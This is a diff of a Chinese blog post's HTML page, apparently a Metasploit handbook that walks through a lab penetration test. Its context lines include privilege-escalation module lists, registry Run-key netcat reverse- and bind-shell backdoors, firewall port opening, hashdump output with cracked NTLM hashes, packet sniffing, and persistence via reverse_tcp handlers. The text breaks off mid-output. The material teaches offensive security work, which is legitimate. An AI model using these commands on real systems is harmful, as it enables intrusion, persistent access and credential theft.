@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>metasploit-framework · Qftm&#39;s Blog</title>
+    <title>Metasploit Framework Handbook · Qftm&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >Qftm&#39;s Blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">metasploit-framework</a>
+                <a href="#" class="post-name">Metasploit Framework Handbook</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            metasploit-framework
+            Metasploit Framework Handbook
             <!-- 404 -->
             
         </h1>
@@ -264,14 +264,22 @@ height:50vh;
             <div class="post-intros">
                 <!-- 文章页标签  -->
                 
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Handbook">Handbook</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Metasploit">Metasploit</a>
+    
+</div>
+                
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">45.5k</span>Reading time: <span class="post-count reading-time">243 min</span></span>
+                        <span>Word count: <span class="post-count word-count">45.5k</span>Reading time: <span class="post-count reading-time">242 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2020/07/04</span>
+                    <span class="post-intro-time">2020/06/20</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -395,9 +403,8 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">title: Metasploit Framework Handbook</span><br><span class="line">date: 2020-06-20 05:02:00</span><br><span class="line">tags:</span><br><span class="line">- Metasploit</span><br><span class="line">- Handbook</span><br><span class="line">categories:</span><br><span class="line">- 神兵利器</span><br></pre></td></tr></table></figure>
+        <h1 id="MsFramework"><a href="#MsFramework" class="headerlink" title="MsFramework"></a>MsFramework</h1><img src="/2020/06/20/metasploit-framework/Metasploit-Framework-Handbook-By-Qftm.jpg" style="zoom:30%;">
 
-<h1 id="MsFramework"><a href="#MsFramework" class="headerlink" title="MsFramework"></a>MsFramework</h1><p><img src="/2020/07/04/metasploit-framework/Metasploit-Framework-Handbook-By-Qftm.jpg" alt></p>
 <h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><p>Metasploit 是一个的渗透测试开源软件，也是一个逐步发展成熟的漏洞研究与渗透测试代码开发平台，此外也将成为支持整个渗透测试过程的安全技术集成开发与应用环境。</p>
 <ul>
 <li>官方相关链接</li>
@@ -675,9 +682,9 @@ height:50vh;
 <li>信息收集</li>
 </ul>
 <p>前期的情报搜集得到主机<code>192.33.6.147</code>、开放<code>80</code>端口，尝试访问继续探索</p>
-<p><img src="/2020/07/04/metasploit-framework/image-20200624103650981.png" alt="image-20200624103650981"></p>
+<p><img src="/2020/06/20/metasploit-framework/image-20200624103650981.png" alt="image-20200624103650981"></p>
 <p>使用<code>wappalyzer</code>探索其网站框架为<code>Drupal</code>、且版本为<code>7</code>、<code>Debian Apache 2.2.22 PHP 5.4.45</code></p>
-<p><img src="/2020/07/04/metasploit-framework/image-20200624104321721.png" alt="image-20200624104321721"></p>
+<p><img src="/2020/06/20/metasploit-framework/image-20200624104321721.png" alt="image-20200624104321721"></p>
 <p>后续利用<code>Metasploit</code>进行渗透测试</p>
 <ul>
 <li>搜索相关模块</li>
@@ -777,7 +784,7 @@ height:50vh;
 <ul>
 <li>网络拓扑</li>
 </ul>
-<p><img src="/2020/07/04/metasploit-framework/image-20200621151944463.png" alt="image-20200621151944463"></p>
+<p><img src="/2020/06/20/metasploit-framework/image-20200621151944463.png" alt="image-20200621151944463"></p>
 <p>网络分布主要分为外网和内网两大部分，在边界路由器中外网IP段为：<code>192.33.6.0/24</code>、内网IP网段为：<code>192.168.9.0/24</code></p>
 <ul>
 <li>msfvenom制作后门反弹shell</li>
@@ -787,7 +794,7 @@ height:50vh;
 <ul>
 <li>实战利用：已得到www服务器后门webshell，上传msf.exe，执行反弹后门shell</li>
 </ul>
-<p><img src="/2020/07/04/metasploit-framework/image-20200701134000487.png" alt="image-20200701134000487"></p>
+<p><img src="/2020/06/20/metasploit-framework/image-20200701134000487.png" alt="image-20200701134000487"></p>
 <h3 id="基本系统操作指令"><a href="#基本系统操作指令" class="headerlink" title="基本系统操作指令"></a>基本系统操作指令</h3><ul>
 <li>指令指南</li>
 </ul>
@@ -832,7 +839,7 @@ height:50vh;
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_stream </span><br><span class="line">[*] Starting...</span><br><span class="line">[*] Preparing player...</span><br><span class="line">[*] Opening player at: &#x2F;home&#x2F;qftm&#x2F;Desktop&#x2F;jhQokqrO.html</span><br><span class="line">[*] Streaming...</span><br><span class="line">Opening in existing browser session.</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/07/04/metasploit-framework/image-20200625141843103.png" alt="image-20200625141843103"></p>
+<p><img src="/2020/06/20/metasploit-framework/image-20200625141843103.png" alt="image-20200625141843103"></p>
 <h3 id="进程操作"><a href="#进程操作" class="headerlink" title="进程操作"></a>进程操作</h3><ul>
 <li>查看目标机进程信息</li>
 </ul>
@@ -1013,7 +1020,7 @@ height:50vh;
 <p>远程登录</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">→ Qftm :~&#x2F;Desktop# rdesktop 192.33.6.150:4445</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/07/04/metasploit-framework/image-20200625185722502.png" alt="image-20200625185722502"></p>
+<p><img src="/2020/06/20/metasploit-framework/image-20200625185722502.png" alt="image-20200625185722502"></p>
 <h3 id="远程监控-桌面截图"><a href="#远程监控-桌面截图" class="headerlink" title="远程监控+桌面截图"></a>远程监控+桌面截图</h3><ul>
 <li>相关指令</li>
 </ul>
@@ -1023,9 +1030,9 @@ height:50vh;
 <li>实战：远程桌面截图+桌面监控</li>
 </ul>
 <p>远程桌面截图</p>
-<p><img src="/2020/07/04/metasploit-framework/image-20200701145642582.png" alt="image-20200701145642582"></p>
+<p><img src="/2020/06/20/metasploit-framework/image-20200701145642582.png" alt="image-20200701145642582"></p>
 <p>远程桌面监控</p>
-<p><img src="/2020/07/04/metasploit-framework/image-20200701144911046.png" alt="image-20200701144911046"></p>
+<p><img src="/2020/06/20/metasploit-framework/image-20200701144911046.png" alt="image-20200701144911046"></p>
 <h3 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h3><ul>
 <li>getgui命令</li>
 </ul>
@@ -1090,7 +1097,7 @@ height:50vh;
 </ul>
 <p>这里操作对象是外网www服务器<code>windows server 2003</code>，已拿到一个反弹的meterpreter的shell，后续进行查看补丁信息，然后查找相应的可利用内核漏洞进行提权。</p>
 <p>反弹shell、查看补丁信息、IP信息：</p>
-<p><img src="/2020/07/04/metasploit-framework/image-20200630235619092.png" alt="image-20200630235619092"></p>
+<p><img src="/2020/06/20/metasploit-framework/image-20200630235619092.png" alt="image-20200630235619092"></p>
 <p>下来可以通过搜索补丁号来查找相应可利用内核提权漏洞：<a href="https://bugs.hacking8.com/tiquan/" target="_blank" rel="noopener">https://bugs.hacking8.com/tiquan/</a></p>
 <p>Metasploit相关Windows内核提权漏洞如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms10_015_kitrap0d</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms10_092_schelevator</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms11_080_afdjoinleaf</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms13_005_hwnd_broadcast</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms13_053_schlamperei</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms13_081_track_popup_menu</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms13_097_ie_registry_symlink</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms14_009_ie_dfsvc</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms14_058_track_popup_menu</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms14_070_tcpip_ioctl</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms15_004_tswbproxy</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms15_051_client_copy_image</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms15_078_atmfd_bof</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms16_014_wmi_recv_notif</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms16_016_webdav</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privesc</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection_juicy</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms18_8120_win32k_privesc</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms_ndproxy</span><br></pre></td></tr></table></figure>
@@ -1127,7 +1134,7 @@ height:50vh;
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br><span class="line">Enumerating: HKLM\software\microsoft\windows\currentversion\run</span><br><span class="line"></span><br><span class="line">No children.</span><br><span class="line">meterpreter &gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v mtfq_nc -d &#39;C:\windows\system32\nc32.exe -d 192.33.6.150 444 -e cmd.exe&#39;</span><br><span class="line">Successfully set mtfq_nc of REG_SZ.</span><br><span class="line">meterpreter &gt;</span><br><span class="line">meterpreter &gt; reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\Run</span><br><span class="line">Enumerating: HKLM\software\microsoft\windows\currentversion\Run</span><br><span class="line"></span><br><span class="line">  Values (1):</span><br><span class="line"></span><br><span class="line">        mtfq_nc</span><br><span class="line">meterpreter &gt; reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v mtfq_nc </span><br><span class="line">Key: HKLM\software\microsoft\windows\currentversion\Run</span><br><span class="line">Name: mtfq_nc</span><br><span class="line">Type: REG_SZ</span><br><span class="line">Data: C:\windows\system32\nc32.exe -d 192.33.6.150 444 -e cmd.exe</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
 
 <p>在受害者主机上查看注册表自启动项和后门位置信息：</p>
-<p><img src="/2020/07/04/metasploit-framework/image-20200702000608081.png" alt="image-20200702000608081"></p>
+<p><img src="/2020/06/20/metasploit-framework/image-20200702000608081.png" alt="image-20200702000608081"></p>
 <p>本地监听反弹后门nc-&gt;shell：攻击机监听本地444端口、受害机重启内网win7主机</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> → Qftm :~&#x2F;Desktop# nc -lvp 444</span><br><span class="line">listening on [any] 444 ...</span><br><span class="line">192.33.6.200: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.33.6.150] from (UNKNOWN) [192.33.6.200] 62657</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Windows\SysWOW64&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">win-5dtie0m734e\administrator</span><br><span class="line"></span><br><span class="line">C:\Windows\SysWOW64&gt;</span><br></pre></td></tr></table></figure>
 
@@ -1148,7 +1155,7 @@ height:50vh;
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br><span class="line">Enumerating: HKLM\software\microsoft\windows\currentversion\run</span><br><span class="line"></span><br><span class="line">No children.</span><br><span class="line">meterpreter &gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v mtfq_nc -d &#39;C:\windows\system32\nc32.exe -Ldp 444 -e cmd.exe&#39;</span><br><span class="line">Successfully set mtfq_nc of REG_SZ.</span><br><span class="line">meterpreter &gt;</span><br><span class="line">meterpreter &gt; reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\Run</span><br><span class="line">Enumerating: HKLM\software\microsoft\windows\currentversion\Run</span><br><span class="line"></span><br><span class="line">  Values (1):</span><br><span class="line"></span><br><span class="line">        mtfq_nc</span><br><span class="line">meterpreter &gt; reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v mtfq_nc </span><br><span class="line">Key: HKLM\software\microsoft\windows\currentversion\Run</span><br><span class="line">Name: mtfq_nc</span><br><span class="line">Type: REG_SZ</span><br><span class="line">Data: C:\windows\system32\nc32.exe -Ldp 444 -e cmd.exe</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
 
 <p>在受害者主机上查看注册表自启动项和后门位置信息：</p>
-<p><img src="/2020/07/04/metasploit-framework/image-20200702005340860.png" alt="image-20200702005340860"></p>
+<p><img src="/2020/06/20/metasploit-framework/image-20200702005340860.png" alt="image-20200702005340860"></p>
 <p>防火墙配置：因为是被动连接，所以开放我们刚才设置的端口，444端口,<code>&quot;Firewall&quot;</code>为其描述</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall add portopening TCP 444 &quot;FireWall&quot; ENABLE ALL</span><br></pre></td></tr></table></figure>
 
@@ -1182,7 +1189,7 @@ height:50vh;
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load sniffer </span><br><span class="line">Loading extension sniffer...Success.</span><br><span class="line">meterpreter &gt; sniffer_interfaces </span><br><span class="line"></span><br><span class="line">1 - &#39;WAN Miniport (Network Monitor)&#39; ( type:3 mtu:1514 usable:true dhcp:false wifi:false )</span><br><span class="line">2 - &#39;Intel(R) PRO&#x2F;1000 MT Network Connection&#39; ( type:0 mtu:1514 usable:true dhcp:true wifi:false )</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_start 2</span><br><span class="line">[*] Capture started on interface 2 (50000 packet buffer)</span><br><span class="line">meterpreter &gt; sniffer_stats 2</span><br><span class="line">[*] Capture statistics for interface 2</span><br><span class="line">        packets: 8</span><br><span class="line">        bytes: 468</span><br><span class="line">meterpreter &gt; sniffer_stats 2</span><br><span class="line">[*] Capture statistics for interface 2</span><br><span class="line">        packets: 3546</span><br><span class="line">        bytes: 1480197</span><br><span class="line">meterpreter &gt; sniffer_dump 2 &#x2F;tmp&#x2F;lab1.pcap</span><br><span class="line">[*] Flushing packet capture buffer for interface 2...</span><br><span class="line">[*] Flushed 3567 packets (1553403 bytes)</span><br><span class="line">[*] Downloaded 033% (524288&#x2F;1553403)...</span><br><span class="line">[*] Downloaded 067% (1048576&#x2F;1553403)...</span><br><span class="line">[*] Downloaded 100% (1553403&#x2F;1553403)...</span><br><span class="line">[*] Download completed, converting to PCAP...</span><br><span class="line">[*] PCAP file written to &#x2F;tmp&#x2F;lab1.pcap</span><br><span class="line">meterpreter &gt; sniffer_stop 2</span><br><span class="line">[*] Capture stopped on interface 2</span><br><span class="line">[*] There are 6 packets (366 bytes) remaining</span><br><span class="line">[*] Download or release them using &#39;sniffer_dump&#39; or &#39;sniffer_release&#39;</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
 
 <p>查看捕获的数据包流量</p>
-<p><img src="/2020/07/04/metasploit-framework/image-20200702110546288.png" alt="image-20200702110546288"></p>
+<p><img src="/2020/06/20/metasploit-framework/image-20200702110546288.png" alt="image-20200702110546288"></p>
 <h3 id="密码抓取"><a href="#密码抓取" class="headerlink" title="密码抓取"></a>密码抓取</h3><ul>
 <li>基本指令</li>
 </ul>
@@ -1200,7 +1207,7 @@ height:50vh;
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">qftm0:1001:aad3b435b51404eeaad3b435b51404ee:3dbde697d71690a769204beb12283678:::</span><br><span class="line">root:1000:aad3b435b51404eeaad3b435b51404ee:329153f560eb329c0e1deea55e88a1e9:::</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
 
 <p>解密账户<code>Administrator</code>:<code>NTLM-&gt;209c6174da490caeb422f3fa5a7ae634</code></p>
-<p><img src="/2020/07/04/metasploit-framework/image-20200703103631433.png" alt="image-20200703103631433"></p>
+<p><img src="/2020/06/20/metasploit-framework/image-20200703103631433.png" alt="image-20200703103631433"></p>
 <p>解密得到账户<code>Administrator</code>密码为<code>admin</code>，<code>Administrator:admin</code>。</p>
 <h3 id="哈希获取-哈希传递"><a href="#哈希获取-哈希传递" class="headerlink" title="哈希获取+哈希传递"></a>哈希获取+哈希传递</h3><p>（1）哈希获取</p>
 <ul>
@@ -1272,7 +1279,7 @@ height:50vh;
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; </span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.33.6.150</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try exploit&#x2F;windows&#x2F;local&#x2F;persistence.</span><br><span class="line">[!] Example: run exploit&#x2F;windows&#x2F;local&#x2F;persistence OPTION&#x3D;value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at &#x2F;home&#x2F;qftm&#x2F;.msf4&#x2F;logs&#x2F;persistence&#x2F;WIN-5DTIE0M734E_20200702.3033&#x2F;WIN-5DTIE0M734E_20200702.3033.rc</span><br><span class="line">[*] Creating Payload&#x3D;windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.33.6.150 LPORT&#x3D;4444</span><br><span class="line">[*] Persistent agent script is 99631 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Windows\TEMP\nQIXoTtl.vbs</span><br><span class="line">[*] Executing script C:\Windows\TEMP\nQIXoTtl.vbs</span><br><span class="line">[+] Agent executed with PID 3064</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\oJAGqgEkK</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\oJAGqgEkK</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
 
 <p>在受害者内网主机Win7上进行查看相关启动项后门信息</p>
-<p><img src="/2020/07/04/metasploit-framework/image-20200703014255873.png" alt="image-20200703014255873"></p>
+<p><img src="/2020/06/20/metasploit-framework/image-20200703014255873.png" alt="image-20200703014255873"></p>
 <p>监听连接后门：主动连接【受害者-&gt;攻击者】这里的后门程序随系统启动自启动之后，每隔5秒都会尝试进行一次反向主动连接（不必担心shell退出之后而无法再次连接的情况）</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 192.33.6.150</span><br><span class="line">LHOST &#x3D;&gt; 192.33.6.150</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LPORT 4444</span><br><span class="line">LPORT &#x3D;&gt; 4444</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;multi&#x2F;handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line">Payload options (windows&#x2F;meterpreter&#x2F;reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.33.6.150     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.33.6.150:4444 </span><br><span class="line">[*] Sending stage (176195 bytes) to 192.33.6.200</span><br><span class="line">[*] Meterpreter session 12 opened (192.33.6.150:4444 -&gt; 192.33.6.200:62130) at 2020-07-02 13:52:50 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: WIN-5DTIE0M734E\Administrator</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
 
@@ -1290,7 +1297,7 @@ height:50vh;
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run metsvc -A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try exploit&#x2F;windows&#x2F;local&#x2F;persistence.</span><br><span class="line">[!] Example: run exploit&#x2F;windows&#x2F;local&#x2F;persistence OPTION&#x3D;value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\ADMINI~1\AppData\Local\Temp\JfwfMtjYhYhn...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">         * Installing service metsvc</span><br><span class="line"> * Starting service</span><br><span class="line">Service metsvc successfully installed.</span><br><span class="line"></span><br><span class="line">[*] Trying to connect to the Meterpreter service at 192.168.9.101:31337...</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
 
 <p>在受害者内网主机Win7上进行查看相关服务后门信息</p>
-<p><img src="/2020/07/04/metasploit-framework/image-20200703021520737.png" alt="image-20200703021520737"></p>
+<p><img src="/2020/06/20/metasploit-framework/image-20200703021520737.png" alt="image-20200703021520737"></p>
 <p>攻击者主动连接后门：被动连接【受害者&lt;-攻击者】</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;metsvc_bind_tcp </span><br><span class="line">payload &#x3D;&gt; windows&#x2F;metsvc_bind_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set RHOST 192.168.9.101</span><br><span class="line">RHOST &#x3D;&gt; 192.168.9.101</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LPORT 31337</span><br><span class="line">LPORT &#x3D;&gt; 31337</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt;</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;multi&#x2F;handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line">Payload options 